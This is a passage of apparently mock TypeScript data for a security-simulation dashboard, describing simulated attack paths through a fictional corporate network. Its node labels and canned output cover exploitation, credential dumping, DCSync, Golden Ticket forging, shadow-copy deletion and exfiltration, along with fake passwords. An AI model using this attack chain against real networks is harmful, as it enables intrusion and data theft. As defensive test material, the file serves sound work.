Nmap done: 254 IP addresses (4 hosts up) scanned in 12.1 seconds`,
    },
  ],
  attack_path_edges: [
    { edge_id: 'r3-c1', edge_source: 'r3-a01', edge_target: 'r3-a02', edge_type: 'chain_flow' },
    { edge_id: 'r3-c2', edge_source: 'r3-a02', edge_target: 'r3-a03', edge_type: 'chain_flow' },
    { edge_id: 'r3-c3', edge_source: 'r3-a03', edge_target: 'r3-a04', edge_type: 'chain_flow', edge_label: 'credential reuse' },
    { edge_id: 'r3-c4', edge_source: 'r3-a04', edge_target: 'r3-a05', edge_type: 'chain_flow' },
    { edge_id: 'r3-c5', edge_source: 'r3-a05', edge_target: 'r3-a06', edge_type: 'chain_flow', edge_label: 'pivot to DC' },
    { edge_id: 'r3-c6', edge_source: 'r3-a06', edge_target: 'r3-a07', edge_type: 'chain_flow', edge_label: 'lateral' },
    { edge_id: 'r3-spray-chain', edge_source: 'r3-a03', edge_target: 'r3-a-spray', edge_type: 'chain_flow', edge_label: 'credential reuse' },
    { edge_id: 'r3-l1', edge_source: 'r3-a01', edge_target: 'r3-ep01', edge_type: 'asset_link' },
    { edge_id: 'r3-l2', edge_source: 'r3-a02', edge_target: 'r3-ep01', edge_type: 'asset_link' },
    { edge_id: 'r3-l3', edge_source: 'r3-a03', edge_target: 'r3-ep01', edge_type: 'asset_link' },
    { edge_id: 'r3-l4', edge_source: 'r3-a04', edge_target: 'r3-ep02', edge_type: 'asset_link' },
    { edge_id: 'r3-l5', edge_source: 'r3-a05', edge_target: 'r3-ep02', edge_type: 'asset_link' },
    { edge_id: 'r3-l6', edge_source: 'r3-a06', edge_target: 'r3-ep03', edge_type: 'asset_link' },
    { edge_id: 'r3-l7', edge_source: 'r3-a07', edge_target: 'r3-ep05', edge_type: 'asset_link' },
    { edge_id: 'r3-spray-ep01', edge_source: 'r3-a-spray', edge_target: 'r3-ep01', edge_type: 'asset_link' },
    { edge_id: 'r3-spray-ep02', edge_source: 'r3-a-spray', edge_target: 'r3-ep02', edge_type: 'asset_link' },
    { edge_id: 'r3-disc01', edge_source: 'r3-ep01', edge_target: 'r3-ep04', edge_type: 'discovery', edge_label: 'nmap scan' },
    { edge_id: 'r3-nmap-ep02', edge_source: 'r3-a-nmap-bulk', edge_target: 'r3-ep02', edge_type: 'asset_link' },
    { edge_id: 'r3-nmap-ep03', edge_source: 'r3-a-nmap-bulk', edge_target: 'r3-ep03', edge_type: 'asset_link' },
    { edge_id: 'r3-nmap-ep04', edge_source: 'r3-a-nmap-bulk', edge_target: 'r3-ep04', edge_type: 'asset_link' },
    { edge_id: 'r3-nmap-ep05', edge_source: 'r3-a-nmap-bulk', edge_target: 'r3-ep05', edge_type: 'asset_link' },
  ],
  attack_path_stats: {
    stats_prevented: 6,
    stats_detected: 2,
    stats_undetected: 1,
    stats_pending: 0,
    stats_total_actions: 9,
    stats_executed_actions: 9,
    stats_captured_endpoints: 1,
    stats_captured_files: 0,
    stats_captured_credentials: 0,
    stats_captured_users: 0,
    stats_captured_cves: 0,
  },
};

// ─────────────────────────────────────────────────────────────────────────────
// SCENARIO 2 – APT Run #2  (Deep breach — all critical systems hit)
// Stats: 18 undetected, 3 detected, 1 prevented
// ─────────────────────────────────────────────────────────────────────────────
export const MOCK_SCENARIO_15EP_RUN2: AttackPathData = {
  attack_path_nodes: [
    // ASSET nodes — all 15 endpoints, most fully compromised
    { node_id: 'apt2-ep01', node_type: 'ASSET', node_label: 'WEB-SRV-01', node_hostname: 'WEB-SRV-01', node_ip: '10.0.1.10', node_platform: 'Ubuntu 20.04 LTS', node_status: 'undetected', node_user_privileges: 'www-data → root', node_accessed_files: ['/var/www/html/config.php', '/etc/shadow'], node_credentials_found: ['tomcat:s3cr3t@dm1n', 'root:toor123'], node_zone: 'DMZ', node_subnet: '10.0.1.0/24', node_is_entry_point: true, node_is_pivot: true, node_agents: ['sentinel_one', 'openaev'], },
    { node_id: 'apt2-ep02', node_type: 'ASSET', node_label: 'MAIL-SRV-01', node_hostname: 'MAIL-SRV-01', node_ip: '10.0.1.15', node_platform: 'Debian 10', node_status: 'undetected', node_user_privileges: 'root', node_accessed_files: ['/var/mail/', '/etc/postfix/main.cf'], node_credentials_found: ['mail_admin:M@il2024'], node_zone: 'DMZ', node_subnet: '10.0.1.0/24', node_is_pivot: true, node_agents: ['palo_alto', 'sentinel_one'], },
    { node_id: 'apt2-ep03', node_type: 'ASSET', node_label: 'VPN-GW-01', node_hostname: 'VPN-GW-01', node_ip: '10.0.1.5', node_platform: 'CentOS 7', node_status: 'undetected', node_user_privileges: 'vpnuser → root', node_accessed_files: ['/etc/openvpn/server.conf'], node_credentials_found: [], node_zone: 'DMZ', node_subnet: '10.0.1.0/24', node_is_pivot: true, node_agents: ['palo_alto', 'openaev'], },
    { node_id: 'apt2-ep04', node_type: 'ASSET', node_label: 'CORP-WS-01', node_hostname: 'CORP-WS-01', node_ip: '10.0.10.101', node_platform: 'Windows 10 Pro', node_status: 'undetected', node_user_privileges: 'CORP\\acct.harris (User)', node_accessed_files: ['C:\\Finance\\Q3_Report.xlsx', 'C:\\Finance\\Contracts\\'], node_credentials_found: [], node_zone: 'Corp LAN', node_subnet: '10.0.10.0/24', node_is_pivot: true, node_agents: ['sentinel_one', 'openaev'], },
    { node_id: 'apt2-ep05', node_type: 'ASSET', node_label: 'CORP-WS-02', node_hostname: 'CORP-WS-02', node_ip: '10.0.10.102', node_platform: 'Windows 10 Pro', node_status: 'undetected', node_user_privileges: 'CORP\\hr.miller', node_accessed_files: ['C:\\HR\\EmployeeRecords.xlsx'], node_credentials_found: [], node_zone: 'Corp LAN', node_subnet: '10.0.10.0/24', node_agents: ['sentinel_one', 'openaev'], },
    { node_id: 'apt2-ep06', node_type: 'ASSET', node_label: 'CORP-WS-03', node_hostname: 'CORP-WS-03', node_ip: '10.0.10.103', node_platform: 'Windows 10 Enterprise', node_status: 'undetected', node_user_privileges: 'CORP\\it.chen (Local Admin)', node_accessed_files: ['C:\\Users\\it.chen\\Desktop\\server_passwords.kdbx'], node_credentials_found: ['CORP\\svc_deploy:Deploy2024!'], node_zone: 'Corp LAN', node_subnet: '10.0.10.0/24', node_agents: ['openaev'], },
    { node_id: 'apt2-ep07', node_type: 'ASSET', node_label: 'CORP-WS-04', node_hostname: 'CORP-WS-04', node_ip: '10.0.10.104', node_platform: 'Windows 10 Pro', node_status: 'undetected', node_user_privileges: 'CORP\\mgmt.jones', node_zone: 'Corp LAN', node_subnet: '10.0.10.0/24', node_agents: ['openaev'], },
    { node_id: 'apt2-ep08', node_type: 'ASSET', node_label: 'CORP-WS-05', node_hostname: 'CORP-WS-05', node_ip: '10.0.10.105', node_platform: 'Windows 10 Pro', node_status: 'undetected', node_user_privileges: 'CORP\\fin.taylor', node_accessed_files: ['C:\\Finance\\Payroll_2024.xlsx', 'C:\\Finance\\Budget_2025.xlsx'], node_credentials_found: [], node_zone: 'Corp LAN', node_subnet: '10.0.10.0/24', node_agents: ['palo_alto'], },
    { node_id: 'apt2-ep09', node_type: 'ASSET', node_label: 'PRINT-SRV-01', node_hostname: 'PRINT-SRV-01', node_ip: '10.0.10.20', node_platform: 'Windows Server 2016', node_status: 'undetected', node_user_privileges: 'CORP\\svc_print → CORP\\svc_mssql', node_accessed_files: ['C:\\Windows\\System32\\spool\\drivers\\'], node_credentials_found: ['CORP\\svc_mssql:Sql@2024Svc'], node_zone: 'Corp LAN', node_subnet: '10.0.10.0/24', node_is_pivot: true, node_agents: ['sentinel_one', 'openaev'], },
    { node_id: 'apt2-ep10', node_type: 'ASSET', node_label: 'APP-SRV-01', node_hostname: 'APP-SRV-01', node_ip: '10.0.20.10', node_platform: 'RHEL 8.6', node_status: 'undetected', node_user_privileges: 'appuser → root', node_accessed_files: ['/opt/app/config/db.conf', '/etc/passwd', '/etc/shadow'], node_credentials_found: ['mysql_root:R00tM3@Prod', 'app_admin:AppAdmin2024'], node_zone: 'Server VLAN', node_subnet: '10.0.20.0/24', node_is_pivot: true, node_agents: ['palo_alto', 'openaev'], },
    { node_id: 'apt2-ep11', node_type: 'ASSET', node_label: 'DB-SRV-01', node_hostname: 'DB-SRV-01', node_ip: '10.0.20.15', node_platform: 'Ubuntu 20.04 LTS', node_status: 'undetected', node_user_privileges: 'mysql → root', node_accessed_files: ['/var/lib/mysql/', '/etc/mysql/mysql.conf.d/mysqld.cnf', '/backup/db_dump_2024.sql'], node_credentials_found: ['SA:Admin@123', 'app_user:AppPass2024', 'backup_user:Backup2024'], node_zone: 'Server VLAN', node_subnet: '10.0.20.0/24', node_agents: ['palo_alto', 'sentinel_one', 'openaev'], },
    { node_id: 'apt2-ep12', node_type: 'ASSET', node_label: 'AD-01 (DC)', node_hostname: 'AD-01', node_ip: '10.0.20.5', node_platform: 'Windows Server 2022', node_status: 'undetected', node_user_privileges: 'CORP\\Administrator (Domain Admin)', node_accessed_files: [], node_credentials_found: ['CORP\\Administrator:$HASH$...', 'All 347 domain accounts extracted (NTDS.dit)', 'CORP\\krbtgt:$HASH$ (Golden Ticket possible)'], node_zone: 'Server VLAN', node_subnet: '10.0.20.0/24', node_agents: ['palo_alto', 'sentinel_one'], },
    { node_id: 'apt2-ep13', node_type: 'ASSET', node_label: 'JUMP-HOST-01', node_hostname: 'JUMP-HOST-01', node_ip: '10.0.30.10', node_platform: 'Windows Server 2019', node_status: 'detected', node_user_privileges: 'CORP\\svc_jumphost (Admin)', node_zone: 'Domain', node_subnet: '10.0.30.0/24', node_agents: ['palo_alto', 'sentinel_one', 'openaev'], },
    { node_id: 'apt2-ep14', node_type: 'ASSET', node_label: 'MGMT-WS-01', node_hostname: 'MGMT-WS-01', node_ip: '10.0.30.101', node_platform: 'Windows 10 Enterprise', node_status: 'undetected', node_user_privileges: 'CORP\\mgmt.admin (Domain Admin)', node_accessed_files: ['C:\\Users\\mgmt.admin\\Documents\\network_map.vsd', 'C:\\Users\\mgmt.admin\\Desktop\\all_passwords.kdbx'], node_credentials_found: ['CORP\\mgmt.admin:Sup3rS3cr3t!', 'CORP\\CEO_delegated:Exec2024!'], node_zone: 'Domain', node_subnet: '10.0.30.0/24', node_agents: ['palo_alto', 'sentinel_one'], },
    { node_id: 'apt2-ep15', node_type: 'ASSET', node_label: 'BACKUP-01', node_hostname: 'BACKUP-01', node_ip: '10.0.30.20', node_platform: 'Ubuntu 22.04 LTS', node_status: 'prevented', node_zone: 'Domain', node_subnet: '10.0.30.0/24', node_agents: ['palo_alto', 'openaev'], },
    // ACTION nodes (22 total)
    { node_id: 'apt2-a01', node_type: 'ACTION', node_label: 'Nmap TCP SYN Scan', node_status: 'undetected', node_payload_name: 'nmap – TCP SYN Scan', node_executed_at: '2026-06-15T06:00:00Z', node_agent: 'openaev', node_ip: '10.0.1.10', node_terminal_output: 'Starting Nmap 7.94\nNmap scan report for WEB-SRV-01 (10.0.1.10)\n22/tcp open ssh\n80/tcp open http\n443/tcp open https\n8080/tcp open http-proxy',
      node_ports_found:['22/tcp open ssh OpenSSH 8.2p1', '80/tcp open http nginx 1.20.2', '443/tcp open ssl/https nginx 1.20.2', '8080/tcp open http Tomcat 9.0.54', '8443/tcp open ssl/https-alt'] },
    { node_id: 'apt2-a02', node_type: 'ACTION', node_label: 'Nuclei Log4Shell RCE', node_status: 'undetected', node_payload_name: 'nuclei – CVE-2021-44228', node_executed_at: '2026-06-15T06:03:22Z', node_agent: 'sentinel_one', node_ip: '10.0.1.10', node_user_privileges: 'www-data → root', node_terminal_output: '[CVE-2021-44228] [critical] RCE confirmed on WEB-SRV-01\n[+] Shell spawned: root@WEB-SRV-01',
      node_cves_found:['CVE-2021-44228 (Log4Shell JNDI RCE) - CRITICAL'] },
    { node_id: 'apt2-a03', node_type: 'ACTION', node_label: 'SSH Pivot to MAIL-SRV', node_status: 'undetected', node_payload_name: 'netexec – SSH auth', node_executed_at: '2026-06-15T06:08:00Z', node_agent: 'sentinel_one', node_ip: '10.0.1.15', node_terminal_output: '[+] SSH 10.0.1.15: root:toor123 (Pwn3d!)\n[+] Full root access on MAIL-SRV-01' },
    { node_id: 'apt2-a04', node_type: 'ACTION', node_label: 'VPN Config Extraction', node_status: 'undetected', node_payload_name: 'netexec – SSH file exfil', node_executed_at: '2026-06-15T06:12:00Z', node_agent: 'openaev', node_ip: '10.0.1.5', node_accessed_files: ['/etc/openvpn/server.conf'], node_terminal_output: '[+] VPN config stolen — internal routing exposed\n[+] Connected to Corp LAN as 10.0.10.200' },
    { node_id: 'apt2-a05', node_type: 'ACTION', node_label: 'Corp LAN Sweep', node_status: 'undetected', node_payload_name: 'nmap – host discovery', node_executed_at: '2026-06-15T06:18:00Z', node_agent: 'openaev', node_ip: '10.0.10.0/24', node_terminal_output: 'Discovered: CORP-WS-01 through CORP-WS-05, PRINT-SRV-01\n6 active hosts found in Corp LAN' },
    { node_id: 'apt2-a06', node_type: 'ACTION', node_label: 'SMB Spray Corp WS', node_status: 'detected', node_payload_name: 'netexec – SMB spray', node_executed_at: '2026-06-15T06:22:00Z', node_agent: 'palo_alto', node_ip: '10.0.10.0/24', node_expectations: [{ expectation_id: 'apt2e1', expectation_type: 'DETECTION', expectation_status: 'SUCCEEDED', expectation_score: 100, expectation_expected_score: 100 }], node_terminal_output: '[!] DETECTION: SMB spray detected but succeeded on CORP-WS-01 and CORP-WS-03\n[+] 2/5 workstations compromised before detection' },
    { node_id: 'apt2-a07', node_type: 'ACTION', node_label: 'CORP-WS-01 Credential Dump', node_status: 'undetected', node_payload_name: 'netexec – SMB mimikatz', node_executed_at: '2026-06-15T06:28:00Z', node_agent: 'palo_alto', node_ip: '10.0.10.101', node_credentials_found: ['CORP\\acct.harris:Finance2024', 'CORP\\svc_deploy:Deploy2024!'], node_terminal_output: '[+] LSASS dump successful on CORP-WS-01\n[+] 2 plaintext credentials extracted' },
    { node_id: 'apt2-a08', node_type: 'ACTION', node_label: 'CORP-WS-03 KeePass Dump', node_status: 'undetected', node_payload_name: 'netexec – SMB file exfil', node_executed_at: '2026-06-15T06:32:00Z', node_agent: 'palo_alto', node_ip: '10.0.10.103', node_accessed_files: ['C:\\Users\\it.chen\\Desktop\\server_passwords.kdbx'], node_credentials_found: ['CORP\\svc_deploy:Deploy2024!'], node_terminal_output: '[+] server_passwords.kdbx downloaded and cracked offline\n[+] 12 server credentials extracted' },
    { node_id: 'apt2-a09', node_type: 'ACTION', node_label: 'PrintNightmare on PRINT-SRV', node_status: 'undetected', node_payload_name: 'nuclei – CVE-2021-34527', node_executed_at: '2026-06-15T06:38:00Z', node_agent: 'sentinel_one', node_ip: '10.0.10.20', node_credentials_found: ['CORP\\svc_mssql:Sql@2024Svc'], node_terminal_output: '[CVE-2021-34527] PrintNightmare RCE on PRINT-SRV-01\n[+] SYSTEM shell obtained\n[+] svc_mssql credentials extracted from registry',
      node_cves_found:['CVE-2021-34527 (PrintNightmare Windows Print Spooler RCE) - CRITICAL'] },
    { node_id: 'apt2-a10', node_type: 'ACTION', node_label: 'App Server SQL Exec', node_status: 'undetected', node_payload_name: 'netexec – MSSQL xp_cmdshell', node_executed_at: '2026-06-15T06:45:00Z', node_agent: 'sentinel_one', node_ip: '10.0.20.10', node_accessed_files: ['/opt/app/config/db.conf'], node_terminal_output: '[+] MSSQL xp_cmdshell enabled on APP-SRV-01\n[+] OS command execution as SQL service account\n[+] DB credentials found in config' },
    { node_id: 'apt2-a11', node_type: 'ACTION', node_label: 'MySQL Full DB Dump', node_status: 'undetected', node_payload_name: 'netexec – MSSQL dump', node_executed_at: '2026-06-15T06:52:00Z', node_agent: 'sentinel_one', node_ip: '10.0.20.15', node_accessed_files: ['/var/lib/mysql/'], node_credentials_found: ['SA:Admin@123', 'app_user:AppPass2024'], node_terminal_output: '[+] Full database dump — 847 tables, 2.3GB exfiltrated\n[+] Customer PII, financial records extracted' },
    { node_id: 'apt2-a12', node_type: 'ACTION', node_label: 'DC Kerberoasting + DCSync', node_status: 'undetected', node_payload_name: 'netexec – LDAP DCSync', node_executed_at: '2026-06-15T07:00:00Z', node_agent: 'openaev', node_ip: '10.0.20.5', node_credentials_found: ['CORP\\Administrator:$HASH$...', 'CORP\\krbtgt:$HASH$'], node_terminal_output: '[+] DCSync successful — full NTDS.dit extracted\n[+] 347 domain accounts dumped\n[+] krbtgt hash obtained — Golden Ticket possible' },
    { node_id: 'apt2-a13', node_type: 'ACTION', node_label: 'CORP-WS-02 WMI Exec', node_status: 'undetected', node_payload_name: 'netexec – WMI exec', node_executed_at: '2026-06-15T07:05:00Z', node_agent: 'sentinel_one', node_ip: '10.0.10.102', node_terminal_output: '[+] WMI execution on CORP-WS-02\n[+] HR documents accessed' },
    { node_id: 'apt2-a14', node_type: 'ACTION', node_label: 'CORP-WS-04 Keylogger', node_status: 'detected', node_payload_name: 'netexec – SMB keylogger deploy', node_executed_at: '2026-06-15T07:08:00Z', node_agent: 'openaev', node_ip: '10.0.10.104', node_expectations: [{ expectation_id: 'apt2e2', expectation_type: 'DETECTION', expectation_status: 'SUCCEEDED', expectation_score: 100, expectation_expected_score: 100 }], node_terminal_output: '[!] DETECTION: Keylogger binary flagged by AV on CORP-WS-04' },
    { node_id: 'apt2-a15', node_type: 'ACTION', node_label: 'CORP-WS-05 Finance Exfil', node_status: 'undetected', node_payload_name: 'netexec – SMB file exfil', node_executed_at: '2026-06-15T07:12:00Z', node_agent: 'sentinel_one', node_ip: '10.0.10.105', node_accessed_files: ['C:\\Finance\\Payroll_2024.xlsx', 'C:\\Finance\\Budget_2025.xlsx'], node_terminal_output: '[+] Finance documents exfiltrated from CORP-WS-05\n[+] 847MB of financial data sent to C2' },
    { node_id: 'apt2-a16', node_type: 'ACTION', node_label: 'Jump Host Lateral Move', node_status: 'detected', node_payload_name: 'netexec – SMB lateral', node_executed_at: '2026-06-15T07:18:00Z', node_agent: 'openaev', node_ip: '10.0.30.10', node_expectations: [{ expectation_id: 'apt2e3', expectation_type: 'DETECTION', expectation_status: 'SUCCEEDED', expectation_score: 100, expectation_expected_score: 100 }], node_terminal_output: '[!] DETECTION: Unusual RDP session on JUMP-HOST-01 flagged' },
    { node_id: 'apt2-a17', node_type: 'ACTION', node_label: 'MGMT-WS-01 Full Compromise', node_status: 'undetected', node_payload_name: 'netexec – SMB pass-the-hash', node_executed_at: '2026-06-15T07:22:00Z', node_agent: 'openaev', node_ip: '10.0.30.101', node_credentials_found: ['CORP\\mgmt.admin:Sup3rS3cr3t!', 'CORP\\CEO_delegated:Exec2024!'], node_accessed_files: ['C:\\Users\\mgmt.admin\\Documents\\network_map.vsd'], node_terminal_output: '[+] MGMT-WS-01 fully compromised via pass-the-hash\n[+] Domain Admin credentials in memory\n[+] Complete network map exfiltrated' },
    { node_id: 'apt2-a18', node_type: 'ACTION', node_label: 'Backup Server SSH', node_status: 'prevented', node_payload_name: 'netexec – SSH brute force', node_executed_at: '2026-06-15T07:28:00Z', node_agent: 'palo_alto', node_ip: '10.0.30.20', node_expectations: [{ expectation_id: 'apt2e4', expectation_type: 'PREVENTION', expectation_status: 'SUCCEEDED', expectation_score: 100, expectation_expected_score: 100 }], node_terminal_output: '[!] PREVENTION: SSH access to BACKUP-01 blocked\n[-] Backup server isolated from compromised segments' },
    { node_id: 'apt2-a19', node_type: 'ACTION', node_label: 'Golden Ticket Forge', node_status: 'undetected', node_payload_name: 'netexec – Kerberos ticket forge', node_executed_at: '2026-06-15T07:35:00Z', node_agent: 'sentinel_one', node_ip: '10.0.20.5', node_credentials_found: ['Forged TGT for CORP\\Administrator — 10yr validity'], node_terminal_output: '[+] Golden Ticket forged using krbtgt hash\n[+] Persistent access established — ticket valid for 10 years' },
    { node_id: 'apt2-a20', node_type: 'ACTION', node_label: 'Shadow Copy Delete', node_status: 'undetected', node_payload_name: 'netexec – SMB vssadmin', node_executed_at: '2026-06-15T07:40:00Z', node_agent: 'palo_alto', node_ip: '10.0.20.5', node_terminal_output: '[+] All VSS shadow copies deleted on AD-01\n[+] Backup deletion complete — ransomware pre-staging done' },
    { node_id: 'apt2-a21', node_type: 'ACTION', node_label: 'WMI Persistence Install', node_status: 'undetected', node_payload_name: 'netexec – WMI persistence', node_executed_at: '2026-06-15T07:45:00Z', node_agent: 'palo_alto', node_ip: '10.0.10.0/24', node_terminal_output: '[+] WMI event subscription persistence on 5 hosts\n[+] Backdoors survive reboot' },
    { node_id: 'apt2-a22', node_type: 'ACTION', node_label: 'C2 Data Exfiltration', node_status: 'undetected', node_payload_name: 'http-query – C2 exfil', node_executed_at: '2026-06-15T07:55:00Z', node_agent: 'palo_alto', node_ip: '10.0.0.0/8', node_terminal_output: '[+] 14.7GB data exfiltrated to C2 via HTTPS\n[+] Includes: NTDS.dit, all finance docs, HR records, DB dumps\n[+] Exfiltration complete' },
    {
      node_id: 'apt2-a-nmap-bulk',
      node_type: 'ACTION',
      node_label: 'Nmap Network Discovery',
      node_status: 'undetected',
      node_payload_name: 'nmap – TCP SYN Scan (corp network)',
      node_executed_at: '2026-06-15T06:30:00Z',
      node_agent: 'openaev',
      node_ip: '10.0.0.0/8',
      node_terminal_output: `Starting Nmap 7.94 at 2026-06-15 06:30 UTC
Nmap scan report for 10.0.1.15 (MAIL-SRV-01)
HOST: up
22/tcp  open  ssh
25/tcp  open  smtp
143/tcp open  imap

Nmap scan report for 10.0.1.5 (VPN-GW-01)
HOST: up
22/tcp  open  ssh
1194/tcp open  openvpn

Nmap scan report for 10.0.10.101 (CORP-WS-01)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap scan report for 10.0.10.102 (CORP-WS-02)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 10.0.10.103 (CORP-WS-03)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap scan report for 10.0.10.104 (CORP-WS-04)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 10.0.10.105 (CORP-WS-05)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 10.0.10.20 (PRINT-SRV-01)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds
9100/tcp open  jetdirect

Nmap scan report for 10.0.20.10 (APP-SRV-01)
HOST: up
22/tcp  open  ssh
8080/tcp open  http

Nmap scan report for 10.0.20.15 (DB-SRV-01)
HOST: up
22/tcp  open  ssh
3306/tcp open  mysql

Nmap scan report for 10.0.20.5 (AD-01)
HOST: up
53/tcp  open  domain
88/tcp  open  kerberos-sec
389/tcp open  ldap
445/tcp open  microsoft-ds

Nmap scan report for 10.0.30.10 (JUMP-HOST-01)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap scan report for 10.0.30.101 (MGMT-WS-01)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap scan report for 10.0.30.20 (BACKUP-01)
HOST: up
22/tcp  open  ssh
873/tcp open  rsync

Nmap done: 254 IP addresses (14 hosts up) scanned in 18.7 seconds`,
    },
  ],
  attack_path_edges: [
    { edge_id: 'apt2-c1', edge_source: 'apt2-a01', edge_target: 'apt2-a02', edge_type: 'chain_flow' },
    { edge_id: 'apt2-c2', edge_source: 'apt2-a02', edge_target: 'apt2-a03', edge_type: 'chain_flow', edge_label: 'pivot' },
    { edge_id: 'apt2-c3', edge_source: 'apt2-a03', edge_target: 'apt2-a04', edge_type: 'chain_flow', edge_label: 'pivot' },
    { edge_id: 'apt2-c4', edge_source: 'apt2-a04', edge_target: 'apt2-a05', edge_type: 'chain_flow', edge_label: 'Corp LAN' },
    { edge_id: 'apt2-c5', edge_source: 'apt2-a05', edge_target: 'apt2-a06', edge_type: 'chain_flow' },
    { edge_id: 'apt2-c6', edge_source: 'apt2-a06', edge_target: 'apt2-a07', edge_type: 'chain_flow' },
    { edge_id: 'apt2-c7', edge_source: 'apt2-a06', edge_target: 'apt2-a08', edge_type: 'chain_flow' },
    { edge_id: 'apt2-c8', edge_source: 'apt2-a07', edge_target: 'apt2-a09', edge_type: 'chain_flow', edge_label: 'PrintNightmare' },
    { edge_id: 'apt2-c9', edge_source: 'apt2-a09', edge_target: 'apt2-a10', edge_type: 'chain_flow', edge_label: 'SQL pivot' },
    { edge_id: 'apt2-c10', edge_source: 'apt2-a10', edge_target: 'apt2-a11', edge_type: 'chain_flow', edge_label: 'DB access' },
    { edge_id: 'apt2-c11', edge_source: 'apt2-a10', edge_target: 'apt2-a12', edge_type: 'chain_flow', edge_label: 'DC pivot' },
    { edge_id: 'apt2-c12', edge_source: 'apt2-a06', edge_target: 'apt2-a13', edge_type: 'chain_flow' },
    { edge_id: 'apt2-c13', edge_source: 'apt2-a06', edge_target: 'apt2-a14', edge_type: 'chain_flow' },
    { edge_id: 'apt2-c14', edge_source: 'apt2-a06', edge_target: 'apt2-a15', edge_type: 'chain_flow' },
    { edge_id: 'apt2-c15', edge_source: 'apt2-a12', edge_target: 'apt2-a16', edge_type: 'chain_flow', edge_label: 'jump host' },
    { edge_id: 'apt2-c16', edge_source: 'apt2-a16', edge_target: 'apt2-a17', edge_type: 'chain_flow' },
    { edge_id: 'apt2-c17', edge_source: 'apt2-a17', edge_target: 'apt2-a18', edge_type: 'chain_flow', edge_label: 'backup' },
    { edge_id: 'apt2-c18', edge_source: 'apt2-a12', edge_target: 'apt2-a19', edge_type: 'chain_flow', edge_label: 'krbtgt' },
    { edge_id: 'apt2-c19', edge_source: 'apt2-a19', edge_target: 'apt2-a20', edge_type: 'chain_flow' },
    { edge_id: 'apt2-c20', edge_source: 'apt2-a12', edge_target: 'apt2-a21', edge_type: 'chain_flow', edge_label: 'persistence' },
    { edge_id: 'apt2-c21', edge_source: 'apt2-a21', edge_target: 'apt2-a22', edge_type: 'chain_flow', edge_label: 'exfil' },
    // asset_link edges
    { edge_id: 'apt2-l1', edge_source: 'apt2-a01', edge_target: 'apt2-ep01', edge_type: 'asset_link' },
    { edge_id: 'apt2-l2', edge_source: 'apt2-a02', edge_target: 'apt2-ep01', edge_type: 'asset_link' },
    { edge_id: 'apt2-l3', edge_source: 'apt2-a03', edge_target: 'apt2-ep02', edge_type: 'asset_link' },
    { edge_id: 'apt2-l4', edge_source: 'apt2-a04', edge_target: 'apt2-ep03', edge_type: 'asset_link' },
    { edge_id: 'apt2-l5', edge_source: 'apt2-a05', edge_target: 'apt2-ep01', edge_type: 'asset_link' },
    { edge_id: 'apt2-l6', edge_source: 'apt2-a06', edge_target: 'apt2-ep04', edge_type: 'asset_link' },
    { edge_id: 'apt2-l7', edge_source: 'apt2-a06', edge_target: 'apt2-ep06', edge_type: 'asset_link' },
    { edge_id: 'apt2-l8', edge_source: 'apt2-a07', edge_target: 'apt2-ep04', edge_type: 'asset_link' },
    { edge_id: 'apt2-l9', edge_source: 'apt2-a08', edge_target: 'apt2-ep06', edge_type: 'asset_link' },
    { edge_id: 'apt2-l10', edge_source: 'apt2-a09', edge_target: 'apt2-ep09', edge_type: 'asset_link' },
    { edge_id: 'apt2-l11', edge_source: 'apt2-a10', edge_target: 'apt2-ep10', edge_type: 'asset_link' },
    { edge_id: 'apt2-l12', edge_source: 'apt2-a11', edge_target: 'apt2-ep11', edge_type: 'asset_link' },
    { edge_id: 'apt2-l13', edge_source: 'apt2-a12', edge_target: 'apt2-ep12', edge_type: 'asset_link' },
    { edge_id: 'apt2-l14', edge_source: 'apt2-a13', edge_target: 'apt2-ep05', edge_type: 'asset_link' },
    { edge_id: 'apt2-l15', edge_source: 'apt2-a14', edge_target: 'apt2-ep07', edge_type: 'asset_link' },
    { edge_id: 'apt2-l16', edge_source: 'apt2-a15', edge_target: 'apt2-ep08', edge_type: 'asset_link' },
    { edge_id: 'apt2-l17', edge_source: 'apt2-a16', edge_target: 'apt2-ep13', edge_type: 'asset_link' },
    { edge_id: 'apt2-l18', edge_source: 'apt2-a17', edge_target: 'apt2-ep14', edge_type: 'asset_link' },
    { edge_id: 'apt2-l19', edge_source: 'apt2-a18', edge_target: 'apt2-ep15', edge_type: 'asset_link' },
    { edge_id: 'apt2-l20', edge_source: 'apt2-a19', edge_target: 'apt2-ep12', edge_type: 'asset_link' },
    { edge_id: 'apt2-l21', edge_source: 'apt2-a20', edge_target: 'apt2-ep12', edge_type: 'asset_link' },
    { edge_id: 'apt2-l22', edge_source: 'apt2-a22', edge_target: 'apt2-ep01', edge_type: 'asset_link' },
    { edge_id: 'apt2-nmap-ep02', edge_source: 'apt2-a-nmap-bulk', edge_target: 'apt2-ep02', edge_type: 'asset_link' },
    { edge_id: 'apt2-nmap-ep03', edge_source: 'apt2-a-nmap-bulk', edge_target: 'apt2-ep03', edge_type: 'asset_link' },
    { edge_id: 'apt2-nmap-ep04', edge_source: 'apt2-a-nmap-bulk', edge_target: 'apt2-ep04', edge_type: 'asset_link' },
    { edge_id: 'apt2-nmap-ep05', edge_source: 'apt2-a-nmap-bulk', edge_target: 'apt2-ep05', edge_type: 'asset_link' },
    { edge_id: 'apt2-nmap-ep06', edge_source: 'apt2-a-nmap-bulk', edge_target: 'apt2-ep06', edge_type: 'asset_link' },
    { edge_id: 'apt2-nmap-ep07', edge_source: 'apt2-a-nmap-bulk', edge_target: 'apt2-ep07', edge_type: 'asset_link' },
    { edge_id: 'apt2-nmap-ep08', edge_source: 'apt2-a-nmap-bulk', edge_target: 'apt2-ep08', edge_type: 'asset_link' },
    { edge_id: 'apt2-nmap-ep09', edge_source: 'apt2-a-nmap-bulk', edge_target: 'apt2-ep09', edge_type: 'asset_link' },
    { edge_id: 'apt2-nmap-ep10', edge_source: 'apt2-a-nmap-bulk', edge_target: 'apt2-ep10', edge_type: 'asset_link' },
